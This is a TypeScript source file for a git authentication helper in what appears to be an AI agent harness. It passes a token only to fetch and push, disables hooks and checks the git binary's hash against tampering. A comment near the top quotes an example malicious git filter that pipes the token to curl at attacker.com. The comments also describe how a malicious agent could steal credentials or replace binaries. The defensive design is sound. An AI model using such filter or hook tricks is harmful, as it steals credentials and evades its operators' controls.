/**
 * git authentication helper using GIT_CONFIG_PARAMETERS.
 * injects Authorization header via http.extraheader config.
 * token is never exposed to shell environment - only to the git subprocess.
 *
 * see wiki/git.md "Subcommand Whitelist" for full security documentation.
 */

import { execSync, spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { readFileSync, realpathSync } from "node:fs";
import { log } from "./cli.ts";
import { filterEnv } from "./secrets.ts";

/**
 * whitelist of git subcommands safe to run with an auth token in GIT_CONFIG_PARAMETERS.
 *
 * git operations fall into two categories:
 *
 * SAFE (remote-only, no working tree):
 *   fetch - downloads objects, updates refs
 *   push  - uploads objects
 *
 * DANGEROUS (touch working tree, trigger filters that inherit the full subprocess env):
 *   checkout, merge, pull, reset, stash, add, commit, diff (with worktree)
 *
 * a malicious agent can set up a git filter via `.git/config`:
 *   [filter "evil"]
 *       clean = bash -c 'echo "$GIT_CONFIG_PARAMETERS" | curl https://attacker.com'
 *
 * if we ran e.g. `$git("checkout", ...)`, that filter would execute with the token
 * in env and exfiltrate it. fetch and push don't touch working tree files, so
 * filters never run. this was verified empirically.
 *
 * operations that need working tree access (checkout, merge) use `$()` from shell.ts
 * which has NO token in its environment.
 */
type SafeGitSubcommand = "fetch" | "push";

type GitAuthOptions = {
  token: string;
  cwd?: string;
  // when true, disables hooks during authenticated git operations to prevent
  // token exfiltration via malicious hooks reading GIT_CONFIG_PARAMETERS.
  // should be true whenever shell is not "enabled" (both restricted and disabled).
  restricted?: boolean;
};

type GitResult = {
  stdout: string;
  stderr: string;
};

// --- git binary resolution and tamper detection ---

type GitBinaryInfo = {
  path: string;
  sha256: string;
};

/** resolved at startup via initGitBinary(), before any agent code runs */
let gitBinary: GitBinaryInfo | undefined;

function hashFile(path: string): string {
  return createHash("sha256").update(readFileSync(path)).digest("hex");
}

/**
 * resolve and fingerprint the git binary. must be called once at startup (in main())
 * before any agent code runs, so the path and hash reflect the untampered binary.
 *
 * resolves symlinks via realpath so the hash is of the actual binary, not a symlink.
 * a malicious agent with sudo could replace the binary later, which is caught by
 * verifyGitBinary() before each authenticated call.
 */
export function resolveGit(): void {
  // `which git` resolves PATH; realpath follows symlinks (e.g. /usr/bin/git -> /usr/lib/git-core/git)
  const whichPath = execSync("which git", { encoding: "utf-8" }).trim();
  const resolvedPath = realpathSync(whichPath);
  const sha256 = hashFile(resolvedPath);
  gitBinary = { path: resolvedPath, sha256 };
  log.info(`» git binary: ${resolvedPath} (sha256: ${sha256.slice(0, 12)}...)`);
}

/**
 * verify the git binary hasn't been tampered with since startup.
 * re-hashes the binary and compares to the startup fingerprint.
 * throws if the binary was replaced (e.g. by a malicious agent with sudo).
 */
function verifyGitBinary(): string {
  if (!gitBinary) {
    throw new Error("git binary not initialized - call resolveGit() at startup");
  }
  const currentHash = hashFile(gitBinary.path);
  if (currentHash !== gitBinary.sha256) {
    throw new Error(
      `git binary tampered with! expected sha256 ${gitBinary.sha256}, got ${currentHash}. ` +
        `path: ${gitBinary.path}`
    );
  }
  return gitBinary.path;
}

/**
 * execute authenticated git command.
 *
 * subcommand is an explicit first argument restricted to "fetch" | "push" at the type level,
 * preventing accidental use with working-tree operations that would expose the token to filters.
 *
 * uses Basic auth format (AUTHORIZATION: basic <base64>) matching actions/checkout.
 * the Bearer format doesn't work with git's extraheader mechanism.
 *
 * the git binary path is resolved once at startup via resolveGit() and verified
 * (sha256 hash check) before each call to detect tampering by a malicious agent.
 *
 * @example
 * $git("fetch", ["origin", "main"], { token, restricted: true });
 * $git("push", ["-u", "origin", "feature"], { token, restricted: true });
 */
export function $git(
  subcommand: SafeGitSubcommand,
  args: string[],
  options: GitAuthOptions
): GitResult {
  const gitPath = verifyGitBinary();
  const cwd = options.cwd ?? process.cwd();

  // SECURITY: disable hooks during authenticated operations to prevent token exfiltration.
  // in restricted mode, agents can write .git/hooks/ via shell; in disabled mode, defense-in-depth.
  if (options.restricted) {
    const hasHooksOverride = args.some(
      (arg) => arg.toLowerCase().includes("hookspath") || arg.toLowerCase().includes("hooks")
    );
    if (hasHooksOverride) {
      throw new Error("Blocked: git args contain hooks-related config");
    }
  }
  const fullArgs = options.restricted
    ? ["-c", "core.hooksPath=/dev/null", subcommand, ...args]
    : [subcommand, ...args];

  log.debug(`git ${fullArgs.join(" ")}`);

  // use Basic auth format matching actions/checkout
  // format: AUTHORIZATION: basic base64(x-access-token:TOKEN)
  // Bearer format does NOT work with git's extraheader - git ignores it
  const basicCredential = Buffer.from(`x-access-token:${options.token}`).toString("base64");

  const result = spawnSync(gitPath, fullArgs, {
    cwd,
    env: {
      ...filterEnv(),
      // inject auth header via GIT_CONFIG_PARAMETERS - never stored, only for this process
      GIT_CONFIG_PARAMETERS: `'http.https://github.com/.extraheader=AUTHORIZATION: basic ${basicCredential}'`,
      // disable terminal prompts (would hang in CI)
      GIT_TERMINAL_PROMPT: "0",
    },
    encoding: "utf-8",
    maxBuffer: 50 * 1024 * 1024,
  });

  if (result.status !== 0) {
    const stderr = result.stderr?.trim() ?? "";
    log.info(`git ${subcommand} failed: ${stderr}`);
    throw new Error(`git ${subcommand} failed: ${stderr}`);
  }

  return {
    stdout: result.stdout?.trim() ?? "",
    stderr: result.stderr?.trim() ?? "",
  };
}
